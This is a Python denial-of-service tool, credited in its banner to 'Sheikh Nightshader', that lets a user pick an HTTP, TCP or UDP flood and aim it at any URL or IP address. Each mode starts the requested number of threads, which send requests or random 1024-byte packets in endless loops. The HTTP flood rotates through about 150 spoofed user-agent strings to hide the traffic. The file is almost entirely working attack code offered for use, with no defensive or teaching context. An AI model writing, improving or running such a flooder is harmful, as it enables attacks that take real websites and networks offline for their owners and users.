#!/usr/bin/env python3
import threading
import socket
import random
import requests
import os
from colorama import Fore, Style, init
init(autoreset=True)

print(Fore.CYAN + r"""
 _   _ _       _     _       _               _
| \ | (_) __ _| |__ | |_ ___| |__   __ _  __| | ___ _ __
|  \| | |/ _` | '_ \| __/ __| '_ \ / _` |/ _` |/ _ \ '__|
| |\  | | (_| | | | | |_\__ \ | | | (_| | (_| |  __/ |
|_| \_|_|\__, |_| |_|\__|___/_| |_|\__,_|\__,_|\___|_|
         |___/

 ____   ___  ____       _   _   _             _
|  _ \ / _ \/ ___|     / \ | |_| |_ __ _  ___| | _____ _ __
| | | | | | \___ \    / _ \| __| __/ _` |/ __| |/ / _ \ '__|
| |_| | |_| |___) |  / ___ \ |_| || (_| | (__|   <  __/ |
|____/ \___/|____/  /_/   \_\__|\__\__,_|\___|_|\_\___|_|

Author: Sheikh Nightshader
""")

RED = Fore.RED
GREEN = Fore.GREEN
CYAN = Fore.CYAN
YELLOW = Fore.YELLOW
RESET = Style.RESET_ALL

builtin_uas = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Windows NT 10.0; WOW64)",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64)",
    "Mozilla/5.0 (Windows NT 6.1)",
    "Mozilla/5.0 (Windows NT 6.3; Win64; x64)",
    "Mozilla/5.0 (Windows NT 6.2; Win64; x64)",
    "Mozilla/5.0 (Windows NT 5.1; rv:40.0)",
    "Mozilla/5.0 (Windows NT 5.1; rv:52.0)",
    "Mozilla/5.0 (Windows NT 5.1)",
    "Mozilla/5.0 (Windows NT 4.0)",
    "Mozilla/5.0 (Windows NT 3.51)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64)",
    "Mozilla/5.0 (X11; Fedora; Linux x86_64)",
    "Mozilla/5.0 (X11; Debian; Linux x86_64)",
    "Mozilla/5.0 (X11; Arch Linux; Linux x86_64)",
    "Mozilla/5.0 (X11; Linux i686)",
    "Mozilla/5.0 (X11; Linux armv7l)",
    "Mozilla/5.0 (X11; Linux aarch64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_6)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_5)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_8 like Mac OS X)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_6 like Mac OS X)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_5 like Mac OS X)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 11_4 like Mac OS X)",
    "Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X)",
    "Mozilla/5.0 (iPad; CPU OS 16_4 like Mac OS X)",
    "Mozilla/5.0 (iPad; CPU OS 15_7 like Mac OS X)",
    "Mozilla/5.0 (iPad; CPU OS 14_4 like Mac OS X)",
    "Mozilla/5.0 (iPad; CPU OS 13_5 like Mac OS X)",
    "Mozilla/5.0 (Android 14; Mobile)",
    "Mozilla/5.0 (Android 13; Mobile)",
    "Mozilla/5.0 (Android 12; Mobile)",
    "Mozilla/5.0 (Android 11; Mobile)",
    "Mozilla/5.0 (Android 10; Mobile)",
    "Mozilla/5.0 (Android 9; Mobile)",
    "Mozilla/5.0 (Android 8.1; Mobile)",
    "Mozilla/5.0 (Android 7.1.2; Mobile)",
    "Mozilla/5.0 (Android 6.0.1; Mobile)",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8)",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7)",
    "Mozilla/5.0 (Linux; Android 12; Pixel 6)",
    "Mozilla/5.0 (Linux; Android 11; Pixel 5)",
    "Mozilla/5.0 (Linux; Android 10; Pixel 4)",
    "Mozilla/5.0 (Linux; Android 14; Samsung SM-S918B)",
    "Mozilla/5.0 (Linux; Android 13; Samsung SM-S916B)",
    "Mozilla/5.0 (Linux; Android 12; Samsung SM-G998B)",
    "Mozilla/5.0 (Linux; Android 11; Samsung SM-G996B)",
    "Mozilla/5.0 (Linux; Android 10; Samsung SM-G975F)",
    "Mozilla/5.0 (Linux; Android 13; OnePlus GM1913)",
    "Mozilla/5.0 (Linux; Android 12; OnePlus KB2003)",
    "Mozilla/5.0 (Linux; Android 11; OnePlus IN2013)",
    "Mozilla/5.0 (Linux; Android 13; Xiaomi Mi 11)",
    "Mozilla/5.0 (Linux; Android 12; Xiaomi Mi 10)",
    "Mozilla/5.0 (Linux; Android 11; Xiaomi Redmi Note 9)",
    "Mozilla/5.0 (Linux; Android 13; Huawei P50)",
    "Mozilla/5.0 (Linux; Android 12; Huawei P40)",
    "Mozilla/5.0 (Linux; Android 11; Huawei Mate 30)",
    "Edge/123.0.0.1",
    "Edge/121.0.2277.98",
    "Edge/118.0.2088.76",
    "Edge/113.0.1774.57",
    "Edge/110.0.1587.57",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:91.0)",
    "Mozilla/5.0 (X11; Linux x86_64; rv:78.0)",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
    "Mozilla/5.0 (compatible; DuckDuckBot/1.1)",
    "Mozilla/5.0 (compatible; Baiduspider/2.0)",
    "curl/8.0",
    "curl/7.88.1",
    "curl/7.79.1",
    "curl/7.68.0",
    "curl/7.55.1",
    "Wget/1.21.3",
    "Wget/1.20.3",
    "Wget/1.19.5",
    "python-requests/2.31.0",
    "python-requests/2.28.1",
    "python-requests/2.27.1",
    "Go-http-client/2.0",
    "Go-http-client/1.1",
    "Java/21",
    "Java/20",
    "Java/19",
    "Java/17",
    "Java/11",
    "okhttp/4.12.0",
    "okhttp/4.9.3",
    "okhttp/4.8.1",
    "Dalvik/2.1.0 (Linux; U; Android 13)",
    "Dalvik/2.1.0 (Linux; U; Android 12)",
    "Dalvik/2.1.0 (Linux; U; Android 11)",
    "Dalvik/2.1.0 (Linux; U; Android 10)",
    "Mozilla/5.0 (PlayStation 5 3.21)",
    "Mozilla/5.0 (PlayStation 4 8.50)",
    "Mozilla/5.0 (PlayStation Vita 3.73)",
    "Mozilla/5.0 (Xbox One; rv:10.0)",
    "Mozilla/5.0 (Xbox Series X; rv:12.0)",
    "Mozilla/5.0 (Nintendo Switch; Mobile; rv:10.0)",
    "Mozilla/5.0 (Nintendo WiiU)",
    "Mozilla/5.0 (Nintendo 3DS; Mobile)",
    "Mozilla/5.0 (SMART-TV; Linux; Tizen 6.5)",
    "Mozilla/5.0 (SMART-TV; Linux; Tizen 5.5)",
    "Mozilla/5.0 (SMART-TV; LGWebOS/6.3.2)",
    "Mozilla/5.0 (ChromeOS; x86_64)",
    "Mozilla/5.0 (CrOS x86_64 15633.0.0)",
    "Mozilla/5.0 (Windows Phone 10.0)",
    "Mozilla/5.0 (Windows Phone 8.1)",
    "Mozilla/5.0 (Windows Phone 8.0)",
    "Mozilla/5.0 (BlackBerry; U; BlackBerry 9900)",
    "Mozilla/5.0 (BlackBerry; U; BlackBerry 9700)",
    "Mozilla/5.0 (BB10; Touch)",
    "Opera/9.80 (Windows NT 6.1; U; Edition Next)",
    "Opera/9.80 (X11; Linux x86_64)",
    "Opera/9.80 (Macintosh; Intel Mac OS X 10.15)",
    "Mozilla/5.0 (compatible; MJ12bot/v1.4.8)",
    "Mozilla/5.0 (compatible; AhrefsBot/7.0)",
    "Mozilla/5.0 (compatible; SemrushBot/7~bl)"
]

file_uas = []
if os.path.exists("user_agents.txt"):
    with open("user_agents.txt", "r") as f:
        file_uas = [line.strip() for line in f if line.strip()]

def get_useragent():
    return random.choice(builtin_uas + file_uas)

def http_flood(target, port, threads):
    session = requests.Session()
    def attack():
        while True:
            try:
                ua = get_useragent()
                session.get(target, headers={"User-Agent": ua}, timeout=3)
                print(GREEN + f"[HTTP] Sent -> {target}:{port} | UA: {ua}")
            except:
                print(RED + "[HTTP] Failed")
    for _ in range(threads):
        threading.Thread(target=attack, daemon=True).start()

def tcp_flood(ip, port, threads):
    data = random._urandom(1024)
    def attack():
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.connect((ip, port))
                s.send(data)
                print(GREEN + f"[TCP] Sent -> {ip}:{port}")
                s.close()
            except:
                print(RED + "[TCP] Failed")
    for _ in range(threads):
        threading.Thread(target=attack, daemon=True).start()

def udp_flood(ip, port, threads):
    data = random._urandom(1024)
    def attack():
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while True:
            try:
                s.sendto(data, (ip, port))
                print(GREEN + f"[UDP] Sent -> {ip}:{port}")
            except:
                print(RED + "[UDP] Failed")
    for _ in range(threads):
        threading.Thread(target=attack, daemon=True).start()

print(CYAN + "[1] HTTP Flood")
print(CYAN + "[2] TCP Flood")
print(CYAN + "[3] UDP Flood\n")

choice = input(YELLOW + "Choose attack type: ")

if choice == "1":
    target = input("Target URL: ")
    port = int(input("Port: "))
    threads = int(input("Threads: "))
    print(CYAN + "\nStarting HTTP flood...\n")
    http_flood(target, port, threads)

elif choice == "2":
    ip = input("Target IP: ")
    port = int(input("Port: "))
    threads = int(input("Threads: "))
    print(CYAN + "\nStarting TCP flood...\n")
    tcp_flood(ip, port, threads)

elif choice == "3":
    ip = input("Target IP: ")
    port = int(input("Port: "))
    threads = int(input("Threads: "))
    print(CYAN + "\nStarting UDP flood...\n")
    udp_flood(ip, port, threads)

else:
    print(RED + "Invalid option")
    exit()

while True:
    pass
